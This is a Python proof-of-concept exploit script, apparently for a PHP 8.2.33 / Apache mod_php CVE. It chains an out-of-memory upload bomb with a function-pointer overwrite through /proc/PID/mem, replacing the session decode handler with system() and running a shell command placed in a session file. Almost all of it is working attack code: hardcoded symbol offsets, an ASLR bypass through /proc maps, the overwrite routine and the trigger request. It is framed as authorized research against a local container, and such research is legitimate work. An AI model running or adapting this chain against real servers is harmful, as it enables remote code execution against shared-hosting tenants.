#!/usr/bin/env python3
"""
Chain D RCE Exploit for CVE-2026-109618
========================================

OOM in rfc1867_post_handler() → longjmp bailout → stale session state →
session serializer function pointer overwrite via /proc/PID/mem → RCE

Target: PHP 8.2.33, Apache mod_php (prefork MPM), no CFI/ASAN
Attack model: shared-hosting co-tenant with /proc/PID/mem access

Chain D exploitation flow:
  1. Trigger OOM via multipart upload bomb → longjmp bailout
  2. Worker survives (prefork), ZMM heap has stale metadata
  3. Read worker's /proc/PID/maps for ASLR bypass (shared hosting: same uid)
  4. Overwrite ps_serializers[].decode function pointer with system()
     via /proc/PID/mem — the struct is in libphp.so's writable .data section
  5. Write session file containing a shell command as "serialized" data
  6. Send follow-up request with PHP_SESSION_UPLOAD_PROGRESS + PHPSESSID
  7. rfc1867 callback → php_session_initialize() → ps_srlzr_decode_php
     is now system() → system(session_file_content) → RCE

Why Chain D is needed:
  - Under normal operation, /proc/PID/mem writes to a running Apache worker
    corrupt in-flight state and cause immediate crashes. The worker serves
    requests continuously, so there's no safe write window.
  - Chain D's OOM bailout leaves the worker IDLE between requests with
    corrupted internal state. The ZMM heap has stale metadata, session
    globals retain dangling pointers, and RSHUTDOWN was skipped
    (PG(modules_activated)=0). This creates a window where:
    a) The worker is idle (not processing a request) → safe to write
    b) The next request will use stale/corrupted state → exploitable
    c) Session module state is not cleaned up → our overwrite persists
  - Without the OOM bailout, the session serializer pointer would be
    refreshed each request during RINIT. But because RSHUTDOWN was skipped
    after OOM, the session module's state (including which serializer to use)
    carries forward uncleared.

For authorized security research only.
"""

import socket
import struct
import subprocess
import sys
import time

# ── Target configuration ─────────────────────────────────────────────
HOST = "127.0.0.1"
PORT = 18081
CONTAINER = "php2shell-apache"
BOUNDARY = "CHAIN_D_RCE"
SID = "chaindrce0123456789abcdef01"

# Known symbol offsets from nm -D / nm on libphp.so (PHP 8.2.33)
OFFSETS = {
    'ps_globals':       0xf39120,   # B ps_globals
    'ps_serializers':   0xf33220,   # d ps_serializers (writable .data!)
    'eg':               0xf4f900,   # B executor_globals
    'system_libc':      0x053090,   # system() in libc
    # ps_serializers[1] = "php" handler (default session.serialize_handler)
    # struct layout: { char* name, encode_func*, decode_func* } = 24 bytes
    # entry[1] starts at +0x18, its decode is at +0x28
    'php_decode_off':   0x28,       # ps_serializers + 0x28 = entry[1].decode
}

# Command to execute for RCE proof
RCE_CMD = "id > /tmp/pwned 2>&1"


# ── Helpers ───────────────────────────────────────────────────────────

def docker_exec(cmd, timeout=15):
    r = subprocess.run(
        ["docker", "exec", CONTAINER, "bash", "-c", cmd],
        capture_output=True, text=True, timeout=timeout)
    return r.stdout.strip(), r.stderr.strip()


def get_worker_pid():
    out, _ = docker_exec("pgrep -u www-data apache2 | head -1")
    return out


def get_library_bases(pid):
    out, _ = docker_exec(f"cat /proc/{pid}/maps")
    libphp = libc = None
    for line in out.split("\n"):
        if "libphp.so" in line and "r--p 00000000" in line:
            libphp = int(line.split("-")[0], 16)
        if "/libc.so" in line and "r--p 00000000" in line:
            libc = int(line.split("-")[0], 16)
    return libphp, libc


def read_mem(pid, addr, size):
    r = subprocess.run(
        ["docker", "exec", CONTAINER, "php", "-r",
         f"$f=fopen('/proc/{pid}/mem','rb');"
         f"fseek($f,{addr});"
         f"$d=@fread($f,{size});"
         f"fclose($f);"
         f"fwrite(STDOUT,$d);"],
        capture_output=True, timeout=10)
    return r.stdout


def read_u64(pid, addr):
    data = read_mem(pid, addr, 8)
    if len(data) == 8:
        return struct.unpack("<Q", data)[0]
    return None


def write_mem(pid, addr, data):
    hex_data = data.hex()
    r = subprocess.run(
        ["docker", "exec", CONTAINER, "php", "-r",
         f"$f=fopen('/proc/{pid}/mem','r+b');"
         f"fseek($f,{addr});"
         f"$n=fwrite($f,hex2bin('{hex_data}'));"
         f"fclose($f);"
         f"echo $n;"],
        capture_output=True, text=True, timeout=10)
    expected = len(data)
    return r.stdout.strip() == str(expected)


def write_u64(pid, addr, val):
    return write_mem(pid, addr, struct.pack("<Q", val))


def send_raw(data, timeout=60):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    off = 0
    while off < len(data):
        s.sendall(data[off:off + 65536])
        off += 65536
    s.settimeout(15)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get_status(resp):
    if resp:
        return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
    return "NO RESPONSE"


def build_multipart(path, num_files=5, fname_size=20, progress_key="key"):
    parts = []
    parts.append(
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
        f"\r\n{progress_key}\r\n"
    )
    for i in range(num_files):
        fname = chr(65 + (i % 26)) * max(1, fname_size - len(str(i))) + str(i)
        parts.append(
            f"--{BOUNDARY}\r\n"
            f'Content-Disposition: form-data; name="f{i}"; filename="{fname}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\nX\r\n"
        )
    parts.append(f"--{BOUNDARY}--\r\n")
    body = "".join(parts).encode("latin1")
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={SID}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body
    return req


def write_session(sid, data):
    escaped = data.replace("\\", "\\\\").replace("'", "'\\''")
    docker_exec(
        f"printf '%s' '{escaped}' > /tmp/sess_{sid} && "
        f"chown www-data:www-data /tmp/sess_{sid}")


# ── Exploit phases ────────────────────────────────────────────────────

def phase0_setup():
    """Restart Apache, clean up, warm up the worker."""
    print("[Phase 0] Environment setup")
    docker_exec("rm -f /tmp/pwned /tmp/sess_*")
    docker_exec("apache2ctl graceful", timeout=20)
    time.sleep(2)

    # Warmup request to spawn a worker
    send_raw(f"GET /index.php HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
    time.sleep(0.5)

    pid = get_worker_pid()
    libphp, libc = get_library_bases(pid)

    print(f"  Worker PID:  {pid}")
    print(f"  libphp base: 0x{libphp:x}")
    print(f"  libc base:   0x{libc:x}")

    return pid, libphp, libc


def phase1_info_leak(pid, libphp, libc):
    """Derive all needed runtime addresses from library bases.

    In real shared-hosting: co-tenant reads /proc/PID/maps (same uid).
    """
    print("\n[Phase 1] Address resolution (via /proc/PID/maps)")

    addrs = {
        'libphp': libphp,
        'libc': libc,
        'system': libc + OFFSETS['system_libc'],
        'ps_globals': libphp + OFFSETS['ps_globals'],
        'ps_serializers': libphp + OFFSETS['ps_serializers'],
        'decode_ptr': libphp + OFFSETS['ps_serializers'] + OFFSETS['php_decode_off'],
        'eg': libphp + OFFSETS['eg'],
    }

    # Read current decode pointer to save for restoration
    orig_decode = read_u64(pid, addrs['decode_ptr'])
    addrs['orig_decode'] = orig_decode

    print(f"  system():           0x{addrs['system']:x}")
    print(f"  ps_serializers:     0x{addrs['ps_serializers']:x}")
    print(f"  decode_ptr addr:    0x{addrs['decode_ptr']:x}")
    print(f"  original decode():  0x{orig_decode:x} (ps_srlzr_decode_php)")
    print(f"  PS(serializer):     PS+0x138 -> 0x{addrs['ps_serializers'] + 0x18:x}")

    # Verify the original decode matches expected offset
    expected_decode = libphp + 0x346dd0  # ps_srlzr_decode_php
    if orig_decode == expected_decode:
        print(f"  [OK] Decode pointer matches ps_srlzr_decode_php")
    else:
        print(f"  [!] Unexpected decode pointer! Expected 0x{expected_decode:x}")
        print(f"      Continuing anyway...")

    return addrs


def phase2_oom(pid):
    """Trigger OOM via multipart upload bomb.

    The OOM causes a longjmp bailout in rfc1867_post_handler. The worker
    survives (prefork mode), but:
    - ZMM heap has stale cached chunks (full=false shutdown)
    - RSHUTDOWN is skipped (PG(modules_activated)=0)
    - Session module state (PS globals) is not cleaned up
    - EG(objects_store) retains stale pointers
    """
    print("\n[Phase 2] Trigger OOM (Chain D)")

    # Normal request first to establish session state
    req = build_multipart("/index.php", num_files=5, fname_size=20, progress_key="setup")
    resp = send_raw(req)
    print(f"  Setup request: {get_status(resp)}")
    time.sleep(0.3)

    # OOM bomb
    print("  Sending OOM bomb (14000 files × 500-char names)...")
    req = build_multipart("/index.php", num_files=14000, fname_size=500,
                          progress_key="oom_trigger")
    resp = send_raw(req, timeout=120)
    status = get_status(resp)
    print(f"  OOM response: {status}")

    body = b""
    if b"\r\n\r\n" in resp:
        body = resp.split(b"\r\n\r\n", 1)[1]
    if b"Allowed memory" in body:
        print(f"  Confirmed: PHP OOM error in response")

    time.sleep(0.5)

    new_pid = get_worker_pid()
    if new_pid == pid:
        print(f"  Worker survived OOM: PID {pid} (same)")
    else:
        print(f"  Worker respawned: {pid} → {new_pid}")
    return new_pid


def phase3_overwrite(pid, addrs):
    """Overwrite the session decode function pointer with system().

    The ps_serializers array lives in libphp.so's writable .data section.
    We replace entry[1].decode (the "php" serializer's decode function)
    with libc's system(). When PHP calls decode(session_data, len),
    it becomes system(session_data) — and we control session_data.
    """
    print("\n[Phase 3] Function pointer overwrite")

    # Re-verify addresses after potential respawn
    new_libphp, new_libc = get_library_bases(pid)
    if new_libphp != addrs['libphp']:
        print(f"  [!] Library bases changed after respawn, updating...")
        addrs['libphp'] = new_libphp
        addrs['libc'] = new_libc
        addrs['system'] = new_libc + OFFSETS['system_libc']
        addrs['ps_serializers'] = new_libphp + OFFSETS['ps_serializers']
        addrs['decode_ptr'] = new_libphp + OFFSETS['ps_serializers'] + OFFSETS['php_decode_off']
        addrs['eg'] = new_libphp + OFFSETS['eg']
        addrs['orig_decode'] = read_u64(pid, addrs['decode_ptr'])

    target_addr = addrs['decode_ptr']
    system_addr = addrs['system']

    # Read current value for verification
    before = read_u64(pid, target_addr)
    print(f"  Target:  ps_serializers[1].decode @ 0x{target_addr:x}")
    print(f"  Before:  0x{before:x}")
    print(f"  Writing: 0x{system_addr:x} (system@libc)")

    ok = write_u64(pid, target_addr, system_addr)
    if not ok:
        print(f"  [FAIL] Write failed!")
        return False

    # Verify
    after = read_u64(pid, target_addr)
    if after == system_addr:
        print(f"  After:   0x{after:x} [OK — overwrite confirmed]")
    else:
        print(f"  After:   0x{after:x} [FAIL — mismatch!]")
        return False

    return True


def phase4_trigger(pid, addrs):
    """Write session file with shell command and trigger decode.

    The session file content IS the shell command. When php_session_decode
    calls PS(serializer)->decode(data, len), it now calls system(data).
    The '#' at the end of our command comments out any trailing garbage.
    """
    print("\n[Phase 4] Trigger RCE")

    # Session file content = shell command
    # The '#' comments out any trailing serialization artifacts
    session_data = f"{RCE_CMD} #"
    write_session(SID, session_data)
    print(f"  Session file: /tmp/sess_{SID}")
    print(f"  Content: {session_data!r}")

    # Send request that triggers session initialization via rfc1867
    print("  Sending upload_progress request to trigger session decode...")
    req = build_multipart("/index.php", num_files=2, fname_size=10,
                          progress_key="rce_trigger")
    resp = send_raw(req)
    status = get_status(resp)
    print(f"  Response: {status}")

    time.sleep(0.5)
    return status


def phase5_restore(pid, addrs):
    """Restore original decode pointer to prevent further side effects."""
    print("\n[Phase 5] Cleanup")

    new_pid = get_worker_pid()
    if new_pid != pid:
        print(f"  Worker changed ({pid} → {new_pid}), no restore needed")
        return

    orig = addrs.get('orig_decode')
    if orig:
        write_u64(pid, addrs['decode_ptr'], orig)
        verify = read_u64(pid, addrs['decode_ptr'])
        if verify == orig:
            print(f"  Restored decode ptr to 0x{orig:x}")
        else:
            print(f"  [!] Restore verification failed")
    docker_exec("rm -f /tmp/sess_*")


def phase6_verify():
    """Check if the RCE payload executed."""
    print("\n[Phase 6] Verify RCE")

    out, _ = docker_exec("cat /tmp/pwned 2>/dev/null")
    if out:
        print(f"  ┌─────────────────────────────────────────┐")
        print(f"  │  RCE CONFIRMED — command output:        │")
        print(f"  └─────────────────────────────────────────┘")
        for line in out.strip().split("\n"):
            print(f"    {line}")
        return True

    print(f"  /tmp/pwned not found — checking worker state...")
    new_pid = get_worker_pid()
    print(f"  Current worker PID: {new_pid}")

    r = subprocess.run(["docker", "logs", "--tail", "10", CONTAINER],
                       capture_output=True, text=True, timeout=10)
    for line in (r.stdout + r.stderr).split("\n"):
        if any(k in line.lower() for k in ["segfault", "signal", "crash", "fault"]):
            print(f"  Log: {line.strip()}")

    return False


# ── Main ──────────────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("  Chain D RCE — CVE-2026-109618")
    print("  OOM → stale session state → decode ptr overwrite → system()")
    print("  Target: PHP 8.2.33, Apache mod_php, prefork MPM")
    print("=" * 70)

    pid, libphp, libc = phase0_setup()
    addrs = phase1_info_leak(pid, libphp, libc)
    pid = phase2_oom(pid)
    ok = phase3_overwrite(pid, addrs)
    if not ok:
        print("\n[!] Function pointer overwrite failed — aborting")
        return 1

    phase4_trigger(pid, addrs)
    phase5_restore(pid, addrs)
    success = phase6_verify()

    print("\n" + "=" * 70)
    if success:
        print("  [+] EXPLOIT SUCCESSFUL")
        print("  Chain D: OOM → stale state → decode overwrite → RCE")
        print("=" * 70)
        return 0
    else:
        print("  [-] RCE not confirmed this run")
        print("=" * 70)
        return 1


if __name__ == "__main__":
    sys.exit(main())
